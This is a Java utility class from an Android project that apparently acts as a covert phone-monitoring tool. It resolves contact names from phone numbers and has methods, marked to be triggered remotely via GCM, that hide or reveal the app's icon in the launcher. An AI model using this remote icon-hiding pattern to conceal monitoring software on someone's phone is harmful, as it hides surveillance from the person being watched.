package net.scottjulian.lateralus.components;


import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import net.scottjulian.lateralus.Config;


public class Utils {
    private static final String TAG = "Utils";

    public static String getContactName(Context context, String phoneNumber) {
        if(phoneNumber.isEmpty()){
            return "";
        }
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        String contactName = Config.NAME_UNKNOWN;
        if (cursor != null && cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            cursor.close();
        }
        return contactName;
    }

    public static String parsePhoneNumber(String number){
        return number.replace('+','\0').replace("\u0000", "").replace("\\u0000", "").replaceAll("\\s", "");
    }

    public static void hideAppInDrawer(Context ctx){
        try {
            // TODO call from GCM
            if(ctx instanceof Activity) {
                Activity act = (Activity) ctx;
                PackageManager p = act.getPackageManager();
                p.setComponentEnabledSetting(act.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
        }
        catch(Exception e){
            Log.e(TAG, "Could not hide app from drawer: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static void showAppInDrawer(Context ctx){
        try {
            // TODO call from GCM
            if(ctx instanceof Activity) {
                Activity act = (Activity) ctx;
                PackageManager p = act.getPackageManager();
                p.setComponentEnabledSetting(act.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            }
        }
        catch(Exception e){
            Log.e(TAG, "Could not show app in drawer: " + e.getMessage());
            e.printStackTrace();
        }
    }

}
